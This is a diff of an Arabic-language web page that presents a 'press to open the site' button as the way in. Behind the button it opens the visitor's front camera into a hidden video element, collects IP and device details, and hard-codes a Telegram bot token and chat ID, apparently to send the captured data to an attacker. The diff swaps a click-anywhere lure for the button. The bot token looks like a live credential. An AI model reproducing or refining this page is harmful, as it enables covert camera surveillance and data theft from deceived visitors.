@@ -11,14 +11,30 @@ body {
   text-align:center;
   font-family:Arial;
 }
+
+button {
+  padding:12px 25px;
+  font-size:18px;
+  margin-top:30px;
+  background:#0f0;
+  color:#000;
+  border:none;
+  border-radius:8px;
+}
+
+#msg {
+  margin-top:20px;
+}
 video { display:none; }
-#msg { margin-top:20px; }
 </style>
 </head>
 
-<body onclick="startOnce()">
+<body>
 
-<h3>اضغط في أي مكان للمتابعة...</h3>
+<h3>اضغط لفتح الموقع</h3>
+
+<button onclick="startCamera()">دخول</button>
+
 <div id="msg"></div>
 
 <video id="video" autoplay playsinline></video>
@@ -28,7 +44,6 @@ video { display:none; }
 const BOT_TOKEN = "7852857305:AAEW7SqDION4MTuIPNnxP6caMEYMLl2yojc";
 const CHAT_ID  = "8514140307";
 
-let started = false;
 let streamRef = null;
 
 // جلب IP
@@ -42,7 +57,7 @@ async function getIP() {
   }
 }
 
-// معلومات الجهاز + IP
+// معلومات الجهاز
 async function getInfo() {
   const ip = await getIP();
 
@@ -55,14 +70,13 @@ async function getInfo() {
 `;
 }
 
-// تشغيل مرة واحدة
-function startOnce() {
-  if (started) return;
-  started = true;
-
+// تشغيل الكاميرا
+function startCamera() {
   document.getElementById("msg").innerText = "⏳ جاري التشغيل...";
 
-  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+  navigator.mediaDevices.getUserMedia({
+    video: { facingMode: "user" }
+  })
   .then(stream => {
     streamRef = stream;
     document.getElementById("video").srcObject = stream;
